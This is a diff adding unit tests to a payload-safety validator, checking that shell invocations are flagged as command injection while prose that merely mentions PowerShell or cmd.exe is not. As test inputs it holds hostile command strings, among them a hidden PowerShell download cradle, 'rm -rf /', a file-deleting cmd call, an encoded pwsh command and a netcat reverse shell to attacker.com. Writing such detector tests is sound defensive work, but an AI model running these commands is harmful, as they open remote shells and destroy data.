@@ -70,9 +70,83 @@ describe('Security level sub-category filtering', () => {
       expect(result.violationType).toBe('COMMAND_INJECTION');
     });
 
+    it('should flag powershell invocation at STORAGE level (command.shellAccess is ALWAYS_CHECK)', () => {
+      const result = validatePayloadSafetyWithLevel(
+        'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient)"',
+        'STORAGE'
+      );
+      expect(result.passed).toBe(false);
+      expect(result.violationType).toBe('COMMAND_INJECTION');
+    });
+
+    it('should flag cmd /c invocation at STORAGE level (command.shellAccess is ALWAYS_CHECK)', () => {
+      const result = validatePayloadSafetyWithLevel(
+        'cmd.exe /c del important.txt',
+        'STORAGE'
+      );
+      expect(result.passed).toBe(false);
+      expect(result.violationType).toBe('COMMAND_INJECTION');
+    });
+
     it('should flag system() at STORAGE level (command.executionWrappers is ALWAYS_CHECK)', () => {
       const result = validatePayloadSafetyWithLevel(
         'system("rm -rf /")',
+        'STORAGE'
+      );
+      expect(result.passed).toBe(false);
+      expect(result.violationType).toBe('COMMAND_INJECTION');
+    });
+  });
+
+  describe('shellAccess requires invocation context, not bare mentions (ALWAYS_CHECK FP class)', () => {
+    // Regression: prose ABOUT shells is not shell access. A tracker save_run payload
+    // containing "PowerShell/cmd shells" in an analysis finding was rejected with
+    // "Command injection detected: PowerShell" despite STORAGE level + relaxedFields,
+    // because shellAccess is ALWAYS_CHECK and its patterns matched bare mentions.
+    it('should NOT flag prose mentioning PowerShell at STORAGE level', () => {
+      const result = validatePayloadSafetyWithLevel(
+        'Degraded ergonomics for PowerShell users; completion exists only for bash, zsh, fish',
+        'STORAGE'
+      );
+      expect(result.passed).toBe(true);
+    });
+
+    it('should NOT flag prose mentioning PowerShell even at EXECUTION level', () => {
+      const result = validatePayloadSafetyWithLevel(
+        'PowerShell is not supported on this platform',
+        'EXECUTION'
+      );
+      expect(result.passed).toBe(true);
+    });
+
+    it('should NOT flag prose mentioning cmd.exe without /c or /k', () => {
+      const result = validatePayloadSafetyWithLevel(
+        'the installer spawns cmd.exe on Windows hosts',
+        'STORAGE'
+      );
+      expect(result.passed).toBe(true);
+    });
+
+    it('should NOT flag a shebang line at STORAGE level', () => {
+      const result = validatePayloadSafetyWithLevel(
+        '#!/bin/sh',
+        'STORAGE'
+      );
+      expect(result.passed).toBe(true);
+    });
+
+    it('should still flag non-shebang /bin/sh at STORAGE level', () => {
+      const result = validatePayloadSafetyWithLevel(
+        'nc attacker.com 4444 -e /bin/sh',
+        'STORAGE'
+      );
+      expect(result.passed).toBe(false);
+      expect(result.violationType).toBe('COMMAND_INJECTION');
+    });
+
+    it('should still flag pwsh invocation with flags', () => {
+      const result = validatePayloadSafetyWithLevel(
+        'pwsh -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
         'STORAGE'
       );
       expect(result.passed).toBe(false);
